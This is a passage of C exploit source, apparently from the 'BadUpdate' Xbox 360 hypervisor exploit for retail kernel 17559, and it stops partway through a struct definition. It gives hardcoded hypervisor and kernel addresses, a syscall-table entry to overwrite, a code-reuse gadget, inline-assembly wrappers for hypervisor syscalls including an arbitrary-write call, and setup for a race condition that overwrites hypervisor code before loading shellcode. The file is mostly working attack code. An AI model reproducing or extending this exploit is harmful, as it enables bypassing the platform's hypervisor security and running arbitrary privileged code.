

// Notes:
//
//  - NO GLOBAL VARIABLES!!! This code is executed from a RX section of memory, any attempt to write to this memory
//      will cause an exception to be thrown and the console to crash. Any data that must be writable must be stored
//      in some runtime allocation that is writable memory.

// Compiler options:
#define KRNL_RETAIL_17559       // Build exploit for retail kernel 17559


typedef struct _STRING {
  USHORT  Length;
  USHORT  MaximumLength;
  PCHAR  Buffer;
} ANSI_STRING;


// Offset into the 14th block of the update file that contains the instructions we want to write at HV_SEG3_OVERWRITE_OFFSET.
// This should point to the following instruction pattern:
//
//      stb     %r4, 2(%r6)
//      blr
#define BLOCK_14_TARGET_OFFSET          0x15E8

#define BLOCK_14_SIZE                   0x1AD0


#if defined(KRNL_RETAIL_17559)

////////////////////////////////////////////////////////////////////////////////////////////////////
// Retail config
////////////////////////////////////////////////////////////////////////////////////////////////////

// Offset into the 3rd segment of the hypervisor we want to overwrite. This should point to the absolute last bit
// of code in the segment that we can overwrite and still hit from a syscall.
#define HV_SEG3_OVERWRITE_OFFSET        0x1F28

// Address into the hypervisor syscall table for the HvxPostOutput entry (syscall 0xD).
#define HV_SYSCALL_POST_OUTPUT_ADDRESS      0x8000010200015FD0 + (0xD * 4)

/*
    Points to the following instruction sequence in _v_DataStorage exception handler:

        mtctr       r4
        bctr

    This gadget MUST be in the first segment of the hypervisor as we can only write a 32-bit
    offset to the syscall entry table.
*/
#define HV_CALL_R4_GADGET_ADDRESS       0x00000354

// Address of MmPhysical64KBMappingTable in the kernel, we update the mapping table to expose the cipher text for
// the hypervisor segments at the virtual address 0xA0000000. This allows for observing when the cipher text changes
// which indicates we won the race condition and a block has overwritten hypervisor code.
#define MmPhysical64KBMappingTable      0x801C1000

////////////////////////////////////////////////////////////////////////////////////////////////////
// Hypervisor syscall ordinals:
#define HVX_KEYS_EXECUTE                        0x42
#define HVX_ENCRYPTED_RESERVE_ALLOCATION        0x49
#define HVX_ENCRYPTED_RELEASE_ALLOCATION        0x4C
#define HVX_ENCRYPTED_ENCRYPT_ALLOCATION        0x4A
#define HVX_REVOKE_UPDATE                       0x65
#define HVX_ARB_WRITE_SYSCALL                   0x21


// Drive mapping for exploit files:
#define PAYLOAD_DRIVE           "PAYLOAD:"

////////////////////////////////////////////////////////////////////////////////////////////////////
// Function addresses:
/* 3 */ void (__cdecl *DbgPrint)(const char* format, ...) = (void(__cdecl*)(const char*, ...))0x80085EE8;

// Do NOT define DbgBreakPoint on retail or the console will halt!!!
#define DbgBreakPoint(...)

/* 190 */ ULONG (*MmGetPhysicalAddress)(PVOID pAddress) = (ULONG(*)(PVOID))0x80080048;
/* 97 */ void (*KeFlushCacheRange)(void *pAddress, DWORD Size) = (void(*)(void*, DWORD))0x80073850;

/* 107 */ ULONG (*KeLockL2)(int index, void* address, ULONG size, ULONG mask1, ULONG mask2) = (ULONG(*)(int, void*, ULONG, ULONG, ULONG))0x80071E00;

/* 168 */ void (*KeStallExecutionProcessor)(ULONG Miliseconds) = (void(*)(ULONG))0x80073484;

/* 300 */ VOID (*RtlInitAnsiString)(ANSI_STRING* pAnsiStr, char *String) = (VOID(*)(ANSI_STRING*, char*))0x80086110;
/* 259 */ UINT (*ObCreateSymbolicLink)( ANSI_STRING* SymbolicLinkName, ANSI_STRING* DeviceName ) = (UINT(*)(ANSI_STRING*, ANSI_STRING*))0x8008AEF0;

/* 41 */ void (*HalSendSMCMessage)(BYTE* pMessage, BOOL bResponse) = (void(*)(BYTE*, BOOL))0x80067F48;

/* 434 */ void (*VdDisplayFatalError)(DWORD code) = (void(*)(DWORD))0x800BDD40;

/* 207 */ DWORD (*NtClose)(HANDLE hHandle) = (DWORD(*)(HANDLE))0x80089EB0;

#endif

// Sanity checks for exploit data:
#if (HV_SEG3_OVERWRITE_OFFSET < BLOCK_14_TARGET_OFFSET)
    #error "HV_SEG3_OVERWRITE_OFFSET must be >= BLOCK_14_TARGET_OFFSET!!"
#endif


// Exploit error codes:
#define ERR_OPEN_UPDATE_FILE                0   // Failed to open update_data.bin
#define ERR_UPDATE_FILE_OOM                 1   // Failed to allocate memory for update file
#define ERR_READING_UPDATE_FILE             2   // Failed to read the update file
#define ERR_OPEN_SHELLCODE_FILE             3   // Failed to open BadUpdateExploit-4thStage.bin
#define ERR_SHELLCODE_FILE_OOM              4   // Failed to allocate memory for shell code file
#define ERR_READING_SHELLCODE_FILE          5   // Failed to read shell code file
#define ERR_LOCKL2_OOM                      6   // Failed to allocate memory for LockL2 call
#define ERR_LOCKL2_RESERVE                  7   // Failed to reserve L2 space
#define ERR_LOCKL2_COMMIT                   8   // Failed to commit L2 space
#define ERR_ENCRYPTED_RESERVE               9   // Failed to reserve encrypted memory
#define ERR_ENCRYPTED_COMMIT                10  // Failed to encrypted reserved memory region
#define ERR_CACHE_FLUSH_BUFFER_OOM          11  // Failed to allocate memory for cache flushing buffer
#define ERR_CIPHER_TEXT_BUFFER_OOM          12  // Failed to allocate memory for cipher text buffer
#define ERR_UPDATE_DATA_OOM                 13  // Failed to allocate memory for update data buffer
#define ERR_XKE_OOM_1                       14  // Failed to allocate memory for XKE payload buffer (working)
#define ERR_XKE_OOM_2                       15  // Failed to allocate memory for XKE payload buffer (clean)
#define ERR_READING_XKE_PAYLOAD_FILE        16  // Failed to read xke_update.bin
#define ERR_CREATING_WORKER_THREAD          17  // Failed to create worker thread
#define ERR_EXPLOIT_PAYLOAD_FAILED          18  // Exploit payload failed to run


static ULONGLONG __declspec(naked) HvxKeysExecute(ULONG Address, DWORD Size, ULONGLONG Arg1, ULONGLONG Arg2, ULONGLONG Arg3, ULONGLONG Arg4)
{
    _asm
    {
        li      r0, HVX_KEYS_EXECUTE
        sc
        blr
    }
}

static BOOL __declspec(naked) HvxEncryptedReserveAllocation(ULONG VirtualAddr, ULONG PhysicalAddr, ULONG Size)
{
    _asm
    {
        li      r0, HVX_ENCRYPTED_RESERVE_ALLOCATION
        sc
        blr
    }
}

static BOOL __declspec(naked) HvxEncryptedEncryptAllocation(ULONG VirtualAddr)
{
    _asm
    {
        li      r0, HVX_ENCRYPTED_ENCRYPT_ALLOCATION
        sc
        blr
    }
}

static BOOL __declspec(naked) HvxEncryptedReleaseAllocation(ULONG VirtualAddr)
{
    _asm
    {
        li      r0, HVX_ENCRYPTED_RELEASE_ALLOCATION
        sc
        blr
    }
}

static ULONG __declspec(naked) HvxRevokeUpdate(ULONG BufferAddr, ULONG BufferSize, ULONG Arg3)
{
    _asm
    {
        li      r0, HVX_REVOKE_UPDATE
        sc
        blr
    }
}

static void __declspec(naked) HvxWriteByte(ULONG ordinal, ULONG address, ULONG size, ULONGLONG writeAddr)
{
    _asm
    {
        li      r0, HVX_ARB_WRITE_SYSCALL
        sc
        blr
    }
}

struct UPDATE_BUFFER_INFO
{
    /* 0x00 */ ULONG TotalSize;                     // Total size of the update buffer, must match input param
    /* 0x04 */ ULONG InfoSize;                      // Size of this structure, must be 0x80
    /* 0x08 */ BYTE _pad0[0x18];
    /* 0x20 */ ULONG UpdateDataOffset;              // Offset of the update data blob
    /* 0x24 */ ULONG UpdateDataSize;                // Size of the update data blob
    /* 0x28 */ ULONG OutputBufferOffset;            // Offset of the output data buffer
    /* 0x2C */ ULONG OutputBufferSize;              // Size of the output data buffer (should match decompressed size found in update data header)
    /* 0x30 */ ULONG ScratchBufferOffset;           // Offset of the scratch buffer used for LZX decompression
    /* 0x34 */ ULONG ScratchBufferSize;             // Size of the scratch buffer
    /* 0x38 */ ULONG Buffer2Offset;                 // Offset of last buffer, not sure what the use is (final output buffer?)
    /* 0x3C */ ULONG Buffer2Size;                   // Size of last buffer
    
    /* 0x60 */ //ULONG
    /* 0x64 */ //ULONG
};

#define CACHE_LINE_SIZE     0x80
#define CACHE_ALIGN(s)      (((s) + 0x7F) & ~0x7F)
#define PAGE_ALIGN_64K(s)   (((s) + 0xFFFF) & ~0xFFFF)

struct THREAD_ARGS
{
    BYTE* pCompressedDataClean;
    DWORD CompressedDataSize;
    BYTE* pCompressedDataInBuffer;
    BYTE* pPayloadClean;
    BYTE* pPayloadBuffer;
    DWORD PayloadPhys;
    DWORD PayloadSize;
    DWORD UpdateDataPhys;
    DWORD UpdateDataSize;
    BYTE* pScratchDataInBuffer;
    DWORD ScratchDataOffset;
    DWORD ScratchDataSize;

    ULONGLONG HvCheckAddress;
    ULONGLONG ShellCodePhysAddress;

    BYTE* pScratchBuffer;
};

struct CIPHER_TEXT_DATA
{
    ULONGLONG dec_end_input_pos;
    ULONGLONG dec_output_buffer;        // New dec_output_buffer pointer (dst address for memcpy)

